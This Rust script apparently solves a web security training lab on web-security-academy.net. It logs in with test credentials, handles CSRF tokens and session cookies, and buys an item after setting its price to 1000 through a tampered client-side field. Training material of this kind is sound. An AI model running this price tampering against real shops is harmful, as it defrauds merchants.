/*****************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 25/10/2023
*
* Lab: Excessive trust in client-side controls
*
* Steps: 1. Fetch login page
*        2. Extract the csrf token and session cookie
*        3. Login as wiener
*        4. Add the leather jacket to the cart with a modified price
*        5. Fetch wiener's cart
*        6. Extract the csrf token needed for placing order
*        7. Place order
*        8. Confirm order
*
******************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a95002204b1f5f584d5136100cb0033.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    print!("{}", "⦗1⦘ Fetching the login page.. ".white());
    io::stdout().flush();

    // fetch the login page
    let login_page = client
        .get(format!("{url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗2⦘ Extracting the csrf token and session cookie.. ".white(),
    );
    io::stdout().flush();

    // extract session cookie
    let mut session = extract_session_cookie(login_page.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract the csrf token
    let mut csrf =
        extract_csrf(login_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗3⦘ Logging in as wiener.. ".white(),);
    io::stdout().flush();

    // login as wiener
    let login = client
        .post(format!("{url}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("csrf", &csrf),
        ]))
        .send()
        .expect(&format!("{}", "[!] Failed to login as wiener".red()));

    // extract session cookie of wiener
    session = extract_session_cookie(login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗4⦘ Adding the leather jacket to the cart with a modified price.. ".white(),
    );
    io::stdout().flush();

    // add the leather jacket to the cart with a modified price
    client
        .post(format!("{url}/cart"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("productId", "1"),
            ("redir", "PRODUCT"),
            ("quantity", "1"),
            ("price", "1000"),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to add the leather jacket to the cart with a modified price".red()
        ));

    println!("{}", "OK".green());
    print!("{}", "⦗5⦘ Fetching wiener's cart.. ".white(),);
    io::stdout().flush();

    // fetch wiener's cart
    let wiener_cart = client
        .get(format!("{url}/cart"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch wiener's cart".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗6⦘ Extracting the csrf token needed for placing order.. ".white(),
    );
    io::stdout().flush();

    // extract the csrf token needed for placing order
    csrf = extract_csrf(wiener_cart).expect(&format!(
        "{}",
        "[!] Failed to extract the csrf token needed for placing order".red()
    ));

    println!("{}", "OK".green());
    print!("{}", "⦗7⦘ Placing order.. ".white(),);
    io::stdout().flush();

    // place order
    client
        .post(format!("{url}/cart/checkout"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([("csrf", &csrf)]))
        .send()
        .expect(&format!("{}", "[!] Failed to place order".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗8⦘ Confirming order.. ".white(),);
    io::stdout().flush();

    /* 
        confirm order to mark the lab as solved.
        without this request the leather jacket will be purchased
        and your credit will be decreased but the lab will sill be unsolved
    */ 
    client
        .get(format!(
            "{url}/cart/order-confirmation?order-confirmed=true"
        ))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to place order".red()));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 The lab should be marked now as".white(),
        "solved".green()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}
